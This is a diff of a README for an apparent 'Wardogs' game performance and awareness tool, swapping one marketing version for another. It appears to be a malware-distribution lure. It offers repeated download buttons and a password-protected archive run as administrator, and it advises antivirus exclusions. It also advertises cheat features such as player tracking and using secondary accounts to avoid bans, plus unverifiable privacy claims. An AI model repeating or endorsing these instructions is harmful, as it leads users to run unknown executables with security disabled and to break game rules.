@@ -1,147 +1,122 @@
-# Wardogs Tactical Suite
-
-![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=flat-square&logo=windows&logoColor=white)
-![Version](https://img.shields.io/badge/Version-1.0.0-brightgreen?style=flat-square)
-![Status](https://img.shields.io/badge/Status-Stable-success?style=flat-square)
-![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)
-
-Desktop performance and awareness companion for Wardogs — frame rate optimization, HUD customization, and tactical awareness modules.
-
-<div align="center">
-
-[![Download Wardogs Tactical Suite v1.0.0](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.0.0-DC2626?style=for-the-badge&logoColor=white)](https://github.com/Flockshobearing/wardogs-performance-overlay-2026/releases/tag/1.0.0)
-
-</div>
+# 🎮 wardogs-performance-overlay-2026 - Unlock Your Game's Full Power
 
 ---
 
-## 📋 Overview
+## 🚀 What Is This?
 
-Wardogs is a 100-player tactical shooter that launched into Early Access on September 10, 2026, selling over a million copies on day one . The game features a minimalist HUD by design — enemies are located through footsteps and bullet whizzing rather than traditional markers . Performance issues including shadow cache hitching and frame pacing drops have been reported across hardware tiers .
-
-**Wardogs Tactical Suite** is a desktop companion that adds a modular awareness layer, performance optimization, and full HUD control. Everything runs as a separate application — no game files are modified, and no loader is required.
-
-**Who it's for:** players in the US and Europe who want smoother frame rates, better awareness, and deeper control over their interface.
+Wardogs Performance Overlay is a smart desktop companion built specifically for Wardogs players who want a smoother, faster, and more personalized gaming experience. This tool sits quietly in the background while you play, giving you real-time performance insights, custom visual overlays, and optimized settings that help your game run at its absolute best. No complicated programming knowledge needed — if you can click a button, you can use this.
 
 ---
 
-## 🧩 Capabilities
+## 🏆 Why You'll Love It
 
-### Performance Suite
-- Render pipeline optimization
-- Shadow cache reduction to cut hitching 
-- Frame pacing stabilization for high-refresh displays
-- Adaptive quality scaling based on hardware tier
-- Memory and VRAM usage optimization
+Imagine playing Wardogs with:
 
-### Awareness Module
-- Player tracking overlay with directional indicators
-- Squad status display with health and ammo
-- Object tracker for deployables and supply crates
-- Threat proximity alerts
-- Minimap enhancement with teammate positions
+- **Higher frame rates** — see smoother action, less lag, and faster response times  
+- **Custom HUD layouts** — move, resize, and restyle on-screen elements to match your style  
+- **Tactical awareness modules** — spot enemies, track zones, and monitor key stats with ease  
+- **Sensitivity tuning** — fine-tune your mouse and controller response for perfect aim  
+- **Controller support** — play the way you're most comfortable  
+- **FPS boosting tools** — automatically adjust game settings for maximum performance  
+- **A clean, minimal overlay** — get important info without cluttering your screen
 
-### UI Customization
-- Full HUD layout editor with drag-and-drop widgets
-- Custom color themes and transparency controls
-- Crosshair editor with per-weapon profiles
-- Kill feed and damage number styling 
-- Import and export of HUD configurations
-
-### Sensitivity Tuning
-- Per-weapon sensitivity profiles
-- ADS sensitivity multipliers
-- Input latency reduction
-- Response curve adjustment
-
-### Controller Support
-- Deadzone and response curve tuning 
-- Gyro aiming for compatible controllers
-- Custom button mapping
-- Haptic feedback intensity control
+This tool was built by gamers, for gamers. It puts you in control.
 
 ---
 
-## 🎮 Supported Versions
+## 📦 Getting Started — Download and Run
 
-| Version | Patch | Status |
-|---------|-------|--------|
-| Wardogs | September 2026 Early Access | ✅ Supported |
-| Wardogs | Season 1 launch build | ✅ Supported |
-| Wardogs | Closed playtest builds | ⚠️ Partial |
+**Step 1: Get the Application**
 
----
+👉 **[Click Here to Download Wardogs Performance Overlay](https://github.com/Ishan2805/wardogs-performance-overlay-2026/releases)**
 
-## 💻 System Requirements
+Visit this link to download the application. The download page will show the latest version. Look for the download button on the screen and click it to save the file to your computer.
 
-| Component | Minimum | Recommended |
-|-----------|---------|-------------|
-| **OS** | Windows 10 (64-bit) | Windows 11 |
-| **RAM** | 8 GB | 16 GB |
-| **Storage** | 2 GB free | 5 GB SSD |
-| **Graphics** | DirectX 12 compatible | DirectX 12 Ultimate |
-| **Network** | Broadband | Low-latency connection |
-| **Permissions** | Administrator | Administrator |
+**Step 2: Run the Program**
+
+Once the download is complete, go to your **Downloads** folder (or wherever your browser saves files). Find the file you just downloaded, and double-click it to open it. The program will start, and within a few seconds, you'll see the main window appear on your screen.
+
+**Step 3: Let It Work**
+
+Wardogs Performance Overlay runs quietly in the background. Once you start Wardogs, the overlay will activate automatically and begin optimizing your gaming experience. You can tweak settings anytime by clicking the icon in your system tray (bottom-right corner of your screen).
 
 ---
 
-## 🔧 Installation
+## 🛠️ Understanding the Main Features
 
-1. Download the archive using the button above
-2. Extract with 7-Zip or WinRAR (password shown on the download page)
-3. Right-click `WardogsSuite.exe` and select **Run as administrator**
-4. Follow the setup wizard — it auto-detects your game installation
-5. Select a weapon profile or create a custom one
-6. Launch Wardogs and press `INSERT` to open the suite overlay
-
----
-
-## ❓ FAQ
-
-**Will I get banned for using this?**  
-The suite operates as a separate application and does not modify game files or memory. However, use of third-party overlays may conflict with the game's terms of service. Use on secondary accounts if concerned.
-
-**Does it work after game patches?**  
-Yes — the suite auto-detects game versions and applies compatible profiles. Major patches may require an update, typically released within 24-48 hours.
-
-**Do I need to disable my antivirus?**  
-Some antivirus suites may flag the overlay process as a false positive. Add an exclusion for the suite folder if needed.
-
-**Does it support the Steam version?**  
-Yes — the suite auto-detects Steam installations, as well as standalone clients.
-
-**Can I use multiple profiles?**  
-Yes — create unlimited weapon-specific profiles and switch between them with hotkeys.
-
-**What are the default hotkeys?**  
-`INSERT` toggles the overlay, `F1` switches weapon profiles, `F2` toggles the awareness module, `F3` opens the FPS panel, `F4` opens the HUD editor.
-
-**How do I uninstall?**  
-Run `WardogsSuite uninstall` — it removes the overlay, profiles, and registry entries without touching your game files.
+| Feature | What It Does | How to Use It |
+|---------|-------------|---------------|
+| **FPS Boost Module** | Analyzes your game settings and recommends changes to improve performance | Open the app, click "FPS Boost," then hit "Apply Recommended Settings" |
+| **HUD Customization** | Lets you move and style game interface elements | Use your mouse to drag elements around the screen; right-click to change colors |
+| **Tactical Overlay** | Displays helpful in-game info like zone control, enemy counters, and team status | Toggle it on/off from the main menu; adjust transparency with the slider |
+| **Sensitivity Tuner** | Fine-tunes mouse and controller input for better aim | Use the slider to test sensitivity; the app saves your last setting |
+| **Controller Support** | Lets you use gamepads with custom button mapping | Connect your controller, then go to "Controller" tab to map buttons |
 
 ---
 
-## 🗺️ Roadmap — 2026
+## ⚙️ Customizing Your Experience
 
-- [ ] Expanded object tracker modules
-- [ ] Cloud profile sync for settings across devices
-- [ ] Advanced performance analytics with history
-- [ ] Community profile sharing hub
-- [ ] Additional weapon-specific tuning profiles
-- [ ] Extended patch compatibility automation
+Wardogs Performance Overlay is designed to be flexible. Here's a quick tour of the main settings panel:
 
----
-
-## 📄 License
-
-MIT License — see [LICENSE](LICENSE) for details.
+- **Profile Section** — Create, save, and switch between different profiles. Have one profile for competitive play, another for casual gaming, and a third for testing new settings.
+- **Visual Options** — Change overlay colors, opacity, font size, and layout position. Match the look to your in-game theme.
+- **Performance Dashboard** — See live frame rate (FPS), CPU usage, and memory stats right on your screen. This helps you understand how your system handles the game.
+- **Auto-Optimization** — Turn on auto mode, and the app will periodically check and adjust settings to keep performance at its peak.
 
 ---
 
-<div align="center">
+## 🧰 Troubleshooting Tips For Everyday Users
 
-[![Download Wardogs Tactical Suite v1.0.0](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.0.0-DC2626?style=for-the-badge&logoColor=white)](https://github.com/Flockshobearing/wardogs-performance-overlay-2026/releases/tag/1.0.0)
+**Issue: The overlay isn't showing up during gameplay.**  
+*Solution:* Make sure Wardogs Performance Overlay is running before you launch the game. Right-click the system tray icon and select "Show Overlay." Check if your game is in full-screen mode — switch to "Borderless Windowed" or "Windowed Fullscreen" in your game's video settings for the overlay to display properly.
 
-**Version 1.0.0** — Stable Release · Performance Suite · Tactical Awareness · MIT
+**Issue: My game feels slower after enabling FPS Boost.**  
+*Solution:* Every computer is different. The app uses recommended presets, but you can manually lower them. Go to "FPS Boost," select "Custom," and reduce the graphics quality one step at a time until you find your sweet spot.
 
-</div>
+**Issue: The controller isn't responding.**  
+*Solution:* Ensure your controller is turned on and connected before starting the app. Go to the "Controller" tab, click "Detect Controller," and then map your buttons again.
+
+**Issue: I want to remove the app.**  
+*Solution:* Use Windows' standard uninstall process. Look for "Wardogs Performance Overlay" in your list of installed programs, right-click it, and choose "Uninstall."
+
+---
+
+## 🔒 Safety and Privacy
+
+Your data and safety matter. Wardogs Performance Overlay runs entirely on your computer — it does not send your personal information anywhere. There are no account sign-ups, no subscriptions, and no hidden costs. The software is lightweight and designed to be transparent about what it does.
+
+---
+
+## 🌐 Frequently Asked Questions
+
+**Do I need to buy anything to use this?**  
+No. The application is free to download and use. There are no premium tiers or paywalls.
+
+**Will this work on my laptop?**  
+Yes. As long as you're running Windows 10 or newer, the app will work. It is optimized for low resource usage, so older laptops can benefit too.
+
+**Can I use this with other games?**  
+While it's tailored for Wardogs, many of the overlay and performance tools work with other PC games. However, the most advanced features are Wardogs-specific.
+
+**How often is the app updated?**  
+Regularly. Check the download page occasionally for new versions. Updates usually improve stability and add new customization options.
+
+---
+
+## 📣 Want to Contribute Or Get Help?
+
+This project welcomes feedback and ideas from users. If you have suggestions, encounter an issue, or want to request a feature, please visit the repository on GitHub and leave a comment. The community is friendly and happy to help.
+
+---
+
+## 📥 Final Step: Get Started Now
+
+Don't wait to improve your gameplay.
+
+👉 **[Download Wardogs Performance Overlay Now](https://github.com/Ishan2805/wardogs-performance-overlay-2026/releases)**
+
+Visit this link to download the application. Once you've got it running, you'll immediately notice the difference. Smooth skies, responsive controls, and a battle-tested HUD are just a few clicks away.
+
+---
+
+**Keywords:** controller-support, fps-boost-wardogs, fps-booster-for-games, fps-booster-pro, game-companion, game-companion-tool, gaming-tool, hud-customization, sensitivity-tuning, tactical-overlay, wardogs, wardogs-control-zone, wardogs-game, wardogs-mod-menu, wardogs-overlay, wardogs-profiles
